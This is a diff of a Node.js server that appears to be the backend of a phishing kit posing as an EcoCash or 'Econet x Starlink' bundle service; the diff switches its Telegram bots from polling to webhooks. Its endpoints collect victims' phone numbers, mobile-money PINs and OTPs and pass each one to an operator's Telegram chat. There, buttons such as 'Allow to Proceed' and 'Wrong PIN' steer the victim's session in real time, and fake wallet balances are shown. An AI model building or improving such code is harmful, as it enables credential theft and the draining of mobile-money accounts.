@@ -1,30 +1,45 @@
-// server.js - Econet x Starlink Data Bundle System
+// server.js -Ecocash System
+// ── WEBHOOK MODE ──────────────────────────────────────────────────────────
+// Uses Telegram webhooks instead of long-polling.
+// Benefits on Render:
+//   • Zero 409 conflicts — no competing getUpdates connections
+//   • Zero reconnect logic — Telegram pushes to us, we never pull
+//   • Zero polling errors in logs
+//   • Lower latency (<100ms vs ~1s for polling round-trip)
+//   • Lower CPU/memory — no persistent outbound connection
+//
+// Required env var:
+//   WEBHOOK_URL=https://your-service.onrender.com
+//   (the /telegram/:secret route is registered automatically per bot)
 'use strict';
 const express     = require('express');
 const cors        = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
+const crypto      = require('crypto');
 require('dotenv').config();
 
 const app  = express();
 const PORT = process.env.PORT || 3001;
 
-// ─── MIDDLEWARE (before routes) ────────────────────────────────────────────
+// Raw body needed for webhook signature verification — must come before json()
+app.use('/telegram', express.raw({ type: 'application/json', limit: '1mb' }));
 app.use(cors());
 app.use(express.json({ limit: '10kb' }));
 
 // ─── CONFIG ────────────────────────────────────────────────────────────────
 const CFG = Object.freeze({
-  DUPE_TTL:          5_000,        // ms — block identical requests within window
-  APPROVAL_TIMEOUT:  5 * 60_000,   // ms — admin must act within 5 min
-  CLEANUP_INTERVAL:  15_000,       // ms — GC frequency (was 60s)
-  READ_TTL:          30_000,       // ms — keep terminal OTP records after first read
+  DUPE_TTL:          5_000,
+  APPROVAL_TIMEOUT:  5 * 60_000,
+  CLEANUP_INTERVAL:  15_000,
+  READ_TTL:          30_000,
   MAX_USERS:         parseInt(process.env.MAX_USERS) || 1,
-  BOT_STARTUP_DELAY: 2_000,
-  MAX_RESTARTS:      5,
-  POLLING_TIMEOUT:   30,           // seconds — Telegram long-poll window
-  TG_CHAT_INTERVAL:  1_050,        // ms — Telegram: 1 msg/s per chat
+  TG_CHAT_INTERVAL:  1_050,       // ms — Telegram: 1 msg/s per chat
   MAX_MSG_SIZE:      4_096,
-  SSE_HEARTBEAT:     20_000,       // ms — keep SSE alive
+  SSE_HEARTBEAT:     20_000,
+  SEND_RETRIES:      3,
+  SEND_RETRY_DELAY:  1_500,
+  // WEBHOOK_URL must be set in env — e.g. https://ecocash-d-server.onrender.com
+  WEBHOOK_URL:       (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
 });
 
 // ─── LOGGER ────────────────────────────────────────────────────────────────
@@ -41,10 +56,8 @@ const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() :
 const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
 const sleep    = (ms) => new Promise(r => setTimeout(r, ms));
 
-// Pre-compiled — reused across all calls, zero recompilation cost
 const RE_NONDIGIT = /\D/g;
 
-// Memoised phone normalisation — same raw input always yields same result
 const _phoneCache = new Map();
 const normalise = (raw) => {
   if (!raw || typeof raw !== 'string') return '';
@@ -72,13 +85,10 @@ const vPhone = (p) => {
   const n = p.replace(RE_NONDIGIT, '');
   return (n.length < 9 || n.length > 15) ? 'Invalid phone length' : null;
 };
-const vPin   = (p) => (!p || typeof p !== 'string') ? 'PIN must be a string'
-                    : !RE_PIN.test(p)               ? 'PIN must be 4-8 digits' : null;
-const vOtp   = (o) => (!o || typeof o !== 'string') ? 'OTP must be a string'
-                    : !RE_OTP.test(o)               ? 'OTP must be 4-8 digits' : null;
+const vPin = (p) => (!p || typeof p !== 'string') ? 'PIN must be a string'  : !RE_PIN.test(p) ? 'PIN must be 4-8 digits' : null;
+const vOtp = (o) => (!o || typeof o !== 'string') ? 'OTP must be a string'  : !RE_OTP.test(o) ? 'OTP must be 4-8 digits' : null;
 
 // ─── O(1) DUPE CACHE ───────────────────────────────────────────────────────
-// Each entry self-expires via a stored setTimeout — no iteration ever needed.
 class DupeCache {
   constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; }
   seen(key) {
@@ -92,8 +102,6 @@ class DupeCache {
 }
 
 // ─── PER-USER TELEGRAM SEND QUEUE ──────────────────────────────────────────
-// Respects Telegram's 1 msg/s per-chat rate limit.
-// Each user has their own queue — they never block each other.
 class TgQueue {
   constructor(interval = CFG.TG_CHAT_INTERVAL) {
     this._q        = [];
@@ -119,28 +127,24 @@ class TgQueue {
     }
     this._running = false;
   }
+  flush(reason = 'queue flushed') {
+    while (this._q.length) this._q.shift().reject(new Error(reason));
+  }
 }
 
 // ─── SSE BROKER ────────────────────────────────────────────────────────────
-// Replaces the polling pattern entirely.
-// Admin taps button → callback fires → sseBroker.push() → client receives
-// status in <50ms instead of waiting for the next poll interval.
 class SseBroker {
   constructor() { this._subs = new Map(); }
-
   subscribe(key, res) {
     res.setHeader('Content-Type',      'text/event-stream');
     res.setHeader('Cache-Control',     'no-cache');
     res.setHeader('Connection',        'keep-alive');
     res.setHeader('X-Accel-Buffering', 'no');
     res.flushHeaders();
-
     const hb    = setInterval(() => { if (!res.writableEnded) res.write(': ping\n\n'); }, CFG.SSE_HEARTBEAT);
     const entry = { res, hb };
-
     if (!this._subs.has(key)) this._subs.set(key, new Set());
     this._subs.get(key).add(entry);
-
     const unsub = () => {
       clearInterval(hb);
       const s = this._subs.get(key);
@@ -150,7 +154,6 @@ class SseBroker {
     res.on('close', unsub);
     res.on('error', unsub);
   }
-
   push(key, payload) {
     const set = this._subs.get(key);
     if (!set?.size) return;
@@ -161,10 +164,8 @@ class SseBroker {
     }
     this._subs.delete(key);
   }
-
   get size() { let n = 0; for (const s of this._subs.values()) n += s.size; return n; }
 }
-
 const sseBroker = new SseBroker();
 
 // ─── MESSAGE FORMATTERS ────────────────────────────────────────────────────
@@ -214,79 +215,122 @@ const parseCb = (d) => {
   return p.length === 4 ? { type: p[0], action: p[1], phone: p[2], secret: p[3] } : null;
 };
 
-// ─── BOT MANAGER ───────────────────────────────────────────────────────────
+// ─── VERSION-SAFE TELEGRAM WEBHOOK HELPERS ────────────────────────────────
+// node-telegram-bot-api exposes webhook methods under slightly different names
+// across versions. We try the known names in order and fall back to a raw
+// HTTPS call (using Node's built-in https module) if nothing works.
+// This makes the code immune to library version differences.
+
+const https = require('https');
+
+const _rawTgCall = (token, method, body = {}) => new Promise((resolve, reject) => {
+  const data = JSON.stringify(body);
+  const req  = https.request({
+    hostname: 'api.telegram.org',
+    path:     `/bot${token}/${method}`,
+    method:   'POST',
+    headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
+  }, (res) => {
+    let raw = '';
+    res.on('data', c => raw += c);
+    res.on('end', () => {
+      try {
+        const parsed = JSON.parse(raw);
+        if (parsed.ok) resolve(parsed.result);
+        else reject(new Error(`Telegram error: ${parsed.description}`));
+      } catch (e) { reject(e); }
+    });
+  });
+  req.on('error', reject);
+  req.write(data);
+  req.end();
+});
+
+// Try named instance methods first (fastest path), then raw HTTPS as fallback.
+const tgDeleteWebhook = (bot, token) =>
+  (bot.deleteWebhook?.() ?? bot.deleteWebHook?.() ?? _rawTgCall(token, 'deleteWebhook', { drop_pending_updates: true }));
+
+const tgSetWebhook = (bot, token, url, opts = {}) =>
+  (bot.setWebhook?.(url, opts) ?? _rawTgCall(token, 'setWebhook', { url, ...opts }));
+
+const tgGetWebhookInfo = (bot, token) =>
+  (bot.getWebhookInfo?.() ?? _rawTgCall(token, 'getWebhookInfo', {}));
+
+// ─── BOT MANAGER (webhook edition) ─────────────────────────────────────────
+// Each bot:
+//   1. Creates a TelegramBot instance with webhook: true (no polling)
+//   2. Registers a unique secret path: /telegram/<webhookSecret>
+//   3. Calls setWebhook() to tell Telegram where to POST updates
+//
+// On redeploy: Telegram simply starts POSTing to the new instance immediately.
+// No conflict. No 409. No reconnect logic needed.
+//
+// The webhookSecret is derived from the bot token so it's stable across
+// deploys but unguessable by outsiders.
+
 class BotManager {
   constructor(user, link) {
-    this.user         = user;
-    this.link         = link;
-    this.bot          = null;
-    this.polling      = false;
-    this.initializing = false;
-    this._p           = null;
-    this.restarts     = 0;
-    this.pollErrors   = 0;
+    this.user   = user;
+    this.link   = link;
+    this.bot    = null;
+    this.ready  = false;
   }
+
+  // Returns the webhook path segment (not the full URL)
+  get _secret() {
+    // Stable, unguessable, derived from token — same across deploys
+    return crypto.createHash('sha256')
+      .update(`wh:${this.user.botToken}`)
+      .digest('hex')
+      .slice(0, 32);
+  }
+
+  get _path() { return `/telegram/${this._secret}`; }
 
   async init() {
-    if (this.initializing) return this._p;
-    this.initializing = true;
-    this._p = this._doInit().finally(() => { this.initializing = false; this._p = null; });
-    return this._p;
-  }
+    if (!CFG.WEBHOOK_URL) {
+      logger.error(`${this.user.name}: WEBHOOK_URL env var not set — cannot register webhook`);
+      return;
+    }
 
-  async _doInit() {
-    await this._cleanup();
-    await sleep(500);
-
+    // Create bot with webhook mode (no polling at all)
     this.bot = new TelegramBot(this.user.botToken, {
-      polling: { interval: 0, autoStart: false, params: { timeout: CFG.POLLING_TIMEOUT } },
+      webHook: false,  // we handle the HTTP route ourselves via Express
       filepath: false,
     });
 
-    this._attachErrors();
     this._attachCommands();
-    await this.bot.startPolling();
-    this.polling = true;
 
-    const me = await this.bot.getMe();
-    logger.info(`${this.user.name}: @${me.username} ready`);
+    const fullUrl = `${CFG.WEBHOOK_URL}${this._path}`;
 
-    this.user.healthy = true;
-    this.user.bot     = this.bot;
-    this.restarts     = 0;
-    this.pollErrors   = 0;
+    try {
+      // 1. Clear any stale webhook / polling session
+      await tgDeleteWebhook(this.bot, this.user.botToken).catch(() => {});
+
+      // 2. Register our new webhook
+      await tgSetWebhook(this.bot, this.user.botToken, fullUrl, {
+        allowed_updates: ['message', 'callback_query'],
+        drop_pending_updates: true,
+      });
+
+      // 3. Verify
+      const info = await tgGetWebhookInfo(this.bot, this.user.botToken).catch(() => ({}));
+      logger.info(`${this.user.name}: webhook set → ${fullUrl}`);
+      logger.debug(`${this.user.name}: pending=${info?.pending_update_count ?? '?'}, lastErr=${info?.last_error_message || 'none'}`);
+
+      this.user.healthy = true;
+      this.user.bot     = this.bot;
+      this.ready        = true;
+    } catch (e) {
+      logger.error(`${this.user.name}: setWebhook failed:`, e.message);
+    }
   }
 
-  async _cleanup() {
+  // Called by Express when Telegram POSTs an update to our webhook path
+  processUpdate(update) {
     if (!this.bot) return;
-    this.bot.removeAllListeners();
-    if (this.polling) try { await this.bot.stopPolling({ cancel: true }); } catch (_) {}
-    try { if (this.bot._polling) this.bot._polling.abort = true; } catch (_) {}
-    this.polling = false;
-    this.bot = this.user.bot = null;
-  }
-
-  _restart(delay = 10_000) {
-    if (this.restarts >= CFG.MAX_RESTARTS) { this.user.healthy = false; return; }
-    if (this.initializing) return;
-    this.restarts++;
-    logger.info(`${this.user.name}: restart #${this.restarts} in ${delay}ms`);
-    const t = setTimeout(() => this.init().catch(e => logger.error(`restart failed:`, e.message)), delay);
-    if (t.unref) t.unref();
-  }
-
-  _attachErrors() {
-    this.bot.on('polling_error', (err) => {
-      this.pollErrors++;
-      logger.error(`${this.user.name}: poll error #${this.pollErrors}:`, err.message);
-      const s = err.response?.statusCode;
-      if (err.code === 'EFATAL')  return this._restart(5_000);
-      if (s === 401)              { this.user.healthy = false; return this._cleanup(); }
-      if (s === 409)              return this._restart(10_000);
-      if (this.pollErrors > 10)   return this._restart(15_000);
-    });
-    this.bot.on('error',         (e) => logger.error(`${this.user.name}: bot error:`,     e.message));
-    this.bot.on('webhook_error', (e) => logger.error(`${this.user.name}: webhook error:`, e.message));
+    try { this.bot.processUpdate(update); }
+    catch (e) { logger.error(`${this.user.name}: processUpdate error:`, e.message); }
   }
 
   _attachCommands() {
@@ -295,7 +339,7 @@ class BotManager {
     bot.onText(/\/start/, async (msg) => {
       try {
         await bot.sendMessage(msg.chat.id,
-          `🛰️ <b>${sanitize(user.name)} — Econet×Starlink Bot</b>\n\n` +
+          `🛰️ <b>${sanitize(user.name)} — Ecocash Bot</b>\n\n` +
           `<b>Chat ID:</b> <code>${msg.chat.id}</code>\n` +
           `<b>Endpoint:</b> <code>/api/${link}/*</code>\n\n` +
           `Add to .env:\n<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
@@ -305,18 +349,35 @@ class BotManager {
 
     bot.onText(/\/status/, async (msg) => {
       try {
+        const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => null);
         await bot.sendMessage(msg.chat.id,
           `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
-          `📊 Pending logins: ${user.logins.size}\n` +
-          `📊 Pending OTPs:   ${user.otps.size}\n` +
-          `✅ Verified users: ${user.verified.size}\n` +
-          `💰 Wallets set:    ${user.wallets.size}\n` +
-          `📡 SSE clients:    ${sseBroker.size}\n` +
+          `📊 Pending logins:  ${user.logins.size}\n` +
+          `📊 Pending OTPs:    ${user.otps.size}\n` +
+          `✅ Verified users:  ${user.verified.size}\n` +
+          `💰 Wallets set:     ${user.wallets.size}\n` +
+          `📡 SSE clients:     ${sseBroker.size}\n` +
           `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
-          `🔄 Restarts: ${this.restarts} | Poll errors: ${this.pollErrors}\n` +
-          `${user.lastErr ? `⚠️ Last error: ${user.lastErr}` : ''}`,
+          `🌐 Webhook: <code>${info?.url || 'unknown'}</code>\n` +
+          `📬 Pending updates: ${info?.pending_update_count ?? '?'}\n` +
+          `${info?.last_error_message ? `⚠️ Last webhook error: ${info.last_error_message}` : '✅ No webhook errors'}\n` +
+          `${user.lastErr ? `⚠️ Last send error: ${sanitize(user.lastErr)}` : ''}`,
           { parse_mode: 'HTML' });
       } catch (e) { logger.error('/status:', e.message); }
+    });
+
+    bot.onText(/\/webhook/, async (msg) => {
+      try {
+        const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => ({}));
+        await bot.sendMessage(msg.chat.id,
+          `🌐 <b>Webhook Info</b>\n\n` +
+          `<b>URL:</b> <code>${info.url || 'not set'}</code>\n` +
+          `<b>Pending:</b> ${info.pending_update_count}\n` +
+          `<b>Max connections:</b> ${info.max_connections || 40}\n` +
+          `<b>Last error:</b> ${info.last_error_message || 'none'}\n` +
+          `<b>Last error time:</b> ${info.last_error_date ? new Date(info.last_error_date * 1000).toLocaleString() : 'never'}`,
+          { parse_mode: 'HTML' });
+      } catch (e) { logger.error('/webhook:', e.message); }
     });
 
     bot.onText(/\/wallet (.+)/, async (msg, match) => {
@@ -336,76 +397,37 @@ class BotManager {
       } catch (e) { logger.error('/wallet:', e.message); }
     });
 
-    bot.onText(/\/restart/, async (msg) => {
-      try {
-        await bot.sendMessage(msg.chat.id, '🔄 Restarting...', { parse_mode: 'HTML' });
-        this.restarts = 0;
-        await this.init();
-        await bot.sendMessage(msg.chat.id, '✅ Restarted!', { parse_mode: 'HTML' });
-      } catch (e) { logger.error('/restart:', e.message); }
-    });
-
     bot.on('callback_query', async (q) => {
       try { await handleCallback(user, q); }
-      catch (e) {
-        // Log only — do NOT answerCallbackQuery here.
-        // handleCallback always answers before any throw, so a second
-        // answer would itself fail and re-trigger the error alert.
-        logger.error(`${user.name}: callback error:`, e.message);
-      }
+      catch (e) { logger.error(`${user.name}: callback error:`, e.message); }
     });
   }
 
-  ok() { return this.polling && this.user.healthy && !this.initializing; }
+  ok() { return this.ready && this.user.healthy; }
 }
 
 // ─── CALLBACK HANDLER ──────────────────────────────────────────────────────
-// Design rules that prevent the "❌ Error" alert:
-//
-//  1. IDEMPOTENCY GUARD — if this callback_query_id was already handled
-//     (double-tap or Telegram duplicate delivery), answer silently and bail.
-//     Telegram delivers each qid exactly once per bot session, but network
-//     retries can cause the library to fire it twice.
-//
-//  2. SINGLE answerCallbackQuery — Telegram allows exactly one answer per qid.
-//     We call it once, at the very end, with the final status text.
-//     The intermediate "⏳ Processing..." is dropped — it caused the double-
-//     answer that showed the error alert.
-//
-//  3. FIRE-AND-FORGET editMessageText — we do NOT await it before answering.
-//     editMessageText is best-effort UI decoration. If it fails (message
-//     already edited, too old, network blip) the record is already updated
-//     in memory and the SSE push already fired — the user flow is unaffected.
-//     We run edit and answer in parallel via Promise.all so neither blocks.
-//
-//  4. RECORD-LEVEL LOCK — once a record is marked terminal (approved/rejected)
-//     any subsequent callback for the same key is a no-op. This handles the
-//     case where the admin taps twice before the keyboard is removed.
-
-const _answeredCallbacks = new Set(); // session-scoped dedup for callback_query ids
+const _answeredCallbacks = new Set();
 
 async function handleCallback(user, q) {
-  const { bot }    = user;
+  const { bot } = user;
   const { data, message: msg, id: qid } = q;
   const { chat: { id: chatId }, message_id: mid } = msg;
 
-  // Rule 1 — idempotency: ignore duplicate deliveries of the same callback
   if (_answeredCallbacks.has(qid)) return;
   _answeredCallbacks.add(qid);
-  // Auto-evict after 10 min so the Set doesn't grow forever
   const t = setTimeout(() => _answeredCallbacks.delete(qid), 10 * 60_000);
   if (t.unref) t.unref();
 
-  // Rule 3 helper — fire-and-forget, never throws into our flow
   const edit = (text) =>
     bot.editMessageText(text, {
       chat_id: chatId, message_id: mid, parse_mode: 'HTML',
       reply_markup: { inline_keyboard: [] },
     }).catch(e => logger.debug('edit skipped:', e.message));
 
-  // Rule 2 helper — ONE answer, called exactly once per handler path
   const answer = (text, alert = false) =>
-    bot.answerCallbackQuery(qid, { text, show_alert: alert }).catch(e => logger.debug('answer:', e.message));
+    bot.answerCallbackQuery(qid, { text, show_alert: alert })
+      .catch(e => logger.debug('answer skipped:', e.message));
 
   const parsed = parseCb(data);
   if (!parsed) { await answer('❌ Bad data', true); return; }
@@ -414,13 +436,10 @@ async function handleCallback(user, q) {
   const key = `${phone}-${secret}`;
   const now = Date.now();
 
-  // ── LOGIN ──
   if (type === 'login') {
     const rec = user.logins.get(key);
-    if (!rec) { await answer('❌ Session not found', true); return; }
-
-    // Rule 4 — already handled
-    if (rec.approved || rec.rejected) { await answer('✅ Already processed'); return; }
+    if (!rec)                          { await answer('❌ Session not found', true); return; }
+    if (rec.approved || rec.rejected)  { await answer('✅ Already processed'); return; }
 
     if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
       Object.assign(rec, { approved: false, rejected: true, expired: true });
@@ -431,13 +450,11 @@ async function handleCallback(user, q) {
       ]);
       return;
     }
-
     if (action === 'proceed') {
       rec.approved = true;
-      const ret = user.verified.has(phone);
       sseBroker.push(`login:${key}`, { approved: true, rejected: false, expired: false, reason: null });
       await Promise.all([
-        edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n${ret ? '→ Dashboard' : '→ OTP step'}`),
+        edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n${user.verified.has(phone) ? '→ Dashboard' : '→ OTP step'}`),
         answer('✅ Allowed!'),
       ]);
     } else if (action === 'invalid') {
@@ -447,18 +464,13 @@ async function handleCallback(user, q) {
         edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
         answer('❌ Marked invalid'),
       ]);
-    } else {
-      await answer('❓ Unknown action');
-    }
+    } else { await answer('❓ Unknown action'); }
     return;
   }
 
-  // ── OTP ──
   if (type === 'otp') {
     const rec = user.otps.get(key);
-    if (!rec) { await answer('❌ Verification not found', true); return; }
-
-    // Rule 4 — already handled
+    if (!rec)                     { await answer('❌ Verification not found', true); return; }
     if (rec.status !== 'pending') { await answer('✅ Already processed'); return; }
 
     if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
@@ -470,7 +482,6 @@ async function handleCallback(user, q) {
       ]);
       return;
     }
-
     if (action === 'correct') {
       rec.status = 'approved';
       user.verified.set(phone, { ts: now });
@@ -493,9 +504,7 @@ async function handleCallback(user, q) {
         edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
         answer('⚠️ Wrong PIN'),
       ]);
-    } else {
-      await answer('❓ Unknown action');
-    }
+    } else { await answer('❓ Unknown action'); }
     return;
   }
 
@@ -506,16 +515,25 @@ async function handleCallback(user, q) {
 async function sendMsg(user, text, opts = {}) {
   if (!user.bot || !user.mgr?.ok()) return { ok: false, err: 'Bot not ready' };
   return user.tgQueue.send(async () => {
-    try {
-      await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
-      return { ok: true };
-    } catch (e) {
-      user.lastErr = e.message;
-      logger.error(`sendMsg [${user.name}]:`, e.code, e.message);
-      const s = e.response?.statusCode;
-      if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
-      if (s === 429) return { ok: false, err: 'Rate limited', retry: e.response.parameters?.retry_after || 30 };
-      return { ok: false, err: e.message };
+    let attempt = 0;
+    while (true) {
+      try {
+        await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
+        user.lastErr = null;
+        return { ok: true };
+      } catch (e) {
+        user.lastErr = e.message;
+        const s = e.response?.statusCode;
+        logger.error(`sendMsg [${user.name}] attempt ${attempt + 1}:`, s || e.code, e.message);
+        if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
+        if (s === 429) {
+          const wait = Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60_000);
+          await sleep(wait);
+          continue;
+        }
+        if (s >= 500 && attempt < CFG.SEND_RETRIES) { attempt++; await sleep(CFG.SEND_RETRY_DELAY * attempt); continue; }
+        return { ok: false, err: e.message };
+      }
     }
   });
 }
@@ -535,7 +553,6 @@ const users = new Map();
     if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) { logger.warn(`User ${i}: bad token`);  fail++; continue; }
     if (!/^-?\d+$/.test(chatId))              { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
     if (users.has(link))                      { logger.warn(`Dup link: ${link}`);     fail++; continue; }
-
     const u = {
       id: i, name: sanitize(name), linkInsert: link, botToken: token, chatId,
       bot: null, healthy: false, lastErr: null,
@@ -553,23 +570,55 @@ const users = new Map();
   logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
 })();
 
-// ─── STAGGERED BOT INIT ────────────────────────────────────────────────────
+// ─── WEBHOOK ROUTES ─────────────────────────────────────────────────────────
+// Register one route per bot. Each route:
+//   1. Returns 200 immediately (Telegram requires fast ack)
+//   2. Processes the update asynchronously
+//
+// The path is /telegram/<sha256_of_token[:32]> — unguessable but stable.
+// No signature header needed because the path itself is the secret.
+
+users.forEach((user) => {
+  const path = user.mgr._path;
+  app.post(path, (req, res) => {
+    // Acknowledge immediately — Telegram retries if we don't respond in 5s
+    res.sendStatus(200);
+    // Parse body (raw Buffer from express.raw middleware)
+    let update;
+    try {
+      const body = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : JSON.stringify(req.body);
+      update = JSON.parse(body);
+    } catch (e) {
+      logger.error(`${user.name}: webhook body parse error:`, e.message);
+      return;
+    }
+    user.mgr.processUpdate(update);
+  });
+  logger.debug(`Registered webhook route: POST ${path} → ${user.name}`);
+});
+
+// ─── BOT INIT ──────────────────────────────────────────────────────────────
+// Stagger slightly so setWebhook calls don't all fire at once
 (async () => {
+  if (!CFG.WEBHOOK_URL) {
+    logger.error('WEBHOOK_URL env var is not set. Add it to your Render environment variables:');
+    logger.error('  WEBHOOK_URL=https://your-service.onrender.com');
+    logger.error('Bots will not receive updates until this is set.');
+  }
   const arr = [...users.values()];
   for (let i = 0; i < arr.length; i++) {
     try   { await arr[i].mgr.init(); }
     catch (e) { logger.error(`Init [${arr[i].name}]:`, e.message); }
-    if (i < arr.length - 1) await sleep(CFG.BOT_STARTUP_DELAY);
+    if (i < arr.length - 1) await sleep(500); // short gap — no polling storm to worry about
   }
-  logger.info('All bots ready');
+  logger.info('All bots initialised');
 })();
 
-// ─── GC (every 15s) ────────────────────────────────────────────────────────
+// ─── GC ────────────────────────────────────────────────────────────────────
 setInterval(() => {
   const now    = Date.now();
   const expire = now - CFG.APPROVAL_TIMEOUT;
   const purge  = now - 10 * 60_000;
-
   for (const u of users.values()) {
     for (const [k, v] of u.logins) {
       if (!v.expired && v.ts < expire) Object.assign(v, { approved: false, rejected: true, expired: true });
@@ -586,13 +635,6 @@ setInterval(() => {
   }
 }, CFG.CLEANUP_INTERVAL).unref?.();
 
-// ─── HEALTH MONITOR (every 60s) ───────────────────────────────────────────
-setInterval(() => {
-  for (const u of users.values())
-    if (u.mgr && !u.mgr.ok() && !u.mgr.initializing && u.mgr.restarts < CFG.MAX_RESTARTS)
-      u.mgr._restart(15_000);
-}, 60_000).unref?.();
-
 // ─── ROUTE HELPERS ────────────────────────────────────────────────────────
 const botOk = (u, res) => {
   if (!u.bot || !u.healthy) { res.status(503).json({ success: false, message: 'Bot service unavailable' }); return false; }
@@ -605,6 +647,7 @@ app.get('/api/health', (_, res) => {
     name: u.name, link: u.linkInsert, healthy: u.healthy, active: !!u.bot,
     logins: u.logins.size, otps: u.otps.size, verified: u.verified.size,
     wallets: u.wallets.size, sse: sseBroker.size, lastErr: u.lastErr,
+    webhookPath: u.mgr._path,
   }));
   res.json({ status: list.some(u => u.healthy) ? 'ok' : 'degraded', users: list, ts: ts() });
 });
@@ -613,7 +656,6 @@ app.get('/api/health', (_, res) => {
 users.forEach((user, link) => {
   const R = `/api/${link}`;
 
-  // check-user-status
   app.post(`${R}/check-user-status`, (req, res) => {
     const raw = req.body.phoneNumber;
     if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
@@ -621,7 +663,6 @@ users.forEach((user, link) => {
     res.json({ success: true, isReturningUser: user.verified.has(normalise(raw)) });
   });
 
-  // get-wallet-balances
   app.post(`${R}/get-wallet-balances`, (req, res) => {
     const raw = req.body.phoneNumber;
     if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
@@ -629,7 +670,6 @@ users.forEach((user, link) => {
     res.json({ success: true, name: w?.name || '', usd: w?.usd ?? 0, zwg: w?.zwg ?? 0 });
   });
 
-  // login
   app.post(`${R}/login`, async (req, res) => {
     if (!botOk(user, res)) return;
     const { pin, timestamp, bundle } = req.body;
@@ -637,27 +677,21 @@ users.forEach((user, link) => {
     if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
     const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
     const ie = vPin(pin);   if (ie) return res.status(400).json({ success: false, message: ie });
-
     const phone = normalise(raw);
-    if (user.dupes.seen(`login:${phone}:${pin}`))
-      return res.json({ success: true, message: 'Cached' });
-
+    if (user.dupes.seen(`login:${phone}:${pin}`)) return res.json({ success: true, message: 'Cached' });
     const key = `${phone}-${pin}`;
     user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false });
-
     const text     = fmtLogin(user, { phone, pin, time: timestamp || Date.now(), bundle });
     const keyboard = { inline_keyboard: [
-      [{ text: '✅ Allow to Proceed',   callback_data: mkCb('login', 'proceed', phone, pin) }],
+      [{ text: '✅ Allow to Proceed',    callback_data: mkCb('login', 'proceed', phone, pin) }],
       [{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }],
     ]};
-
     const r = await sendMsg(user, text, { reply_markup: keyboard });
     r.ok
       ? res.json({ success: true, message: 'Waiting for approval' })
       : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
   });
 
-  // check-login-approval  (polling — kept for backwards compatibility)
   app.post(`${R}/check-login-approval`, (req, res) => {
     const { pin } = req.body;
     const raw     = req.body.phoneNumber;
@@ -670,8 +704,7 @@ users.forEach((user, link) => {
     res.json({ success: true, approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null });
   });
 
-  // stream-login-approval  (SSE — instant, replaces polling)
-  // Usage: GET /api/{link}/stream-login-approval?phone=+263771234567&pin=1234
+  // SSE — instant push (replaces polling)
   app.get(`${R}/stream-login-approval`, (req, res) => {
     const { phone: rp, pin } = req.query;
     if (!rp || !pin) return res.status(400).json({ success: false, message: 'phone and pin required' });
@@ -679,15 +712,13 @@ users.forEach((user, link) => {
     const key   = `${phone}-${pin}`;
     const rec   = user.logins.get(key);
     if (rec && (rec.approved || rec.rejected)) {
-      res.setHeader('Content-Type', 'text/event-stream');
-      res.flushHeaders();
+      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
       res.write(`data: ${JSON.stringify({ approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null })}\n\n`);
       return res.end();
     }
     sseBroker.subscribe(`login:${key}`, res);
   });
 
-  // verify-otp
   app.post(`${R}/verify-otp`, async (req, res) => {
     if (!botOk(user, res)) return;
     const { otp, timestamp, bundle } = req.body;
@@ -695,14 +726,10 @@ users.forEach((user, link) => {
     if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
     const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
     const oe = vOtp(otp);   if (oe) return res.status(400).json({ success: false, message: oe });
-
     const phone = normalise(raw);
-    if (user.dupes.seen(`otp:${phone}:${otp}`))
-      return res.json({ success: true, message: 'Cached' });
-
+    if (user.dupes.seen(`otp:${phone}:${otp}`)) return res.json({ success: true, message: 'Cached' });
     const key = `${phone}-${otp}`;
     user.otps.set(key, { status: 'pending', ts: Date.now() });
-
     const text     = fmtOtp(user, { phone, otp, time: timestamp || Date.now(), bundle });
     const keyboard = { inline_keyboard: [
       [{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct',  phone, otp) }],
@@ -711,14 +738,12 @@ users.forEach((user, link) => {
         { text: '⚠️ Wrong PIN',  callback_data: mkCb('otp', 'wrongpin', phone, otp) },
       ],
     ]};
-
     const r = await sendMsg(user, text, { reply_markup: keyboard });
     r.ok
       ? res.json({ success: true, message: 'OTP sent' })
       : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
   });
 
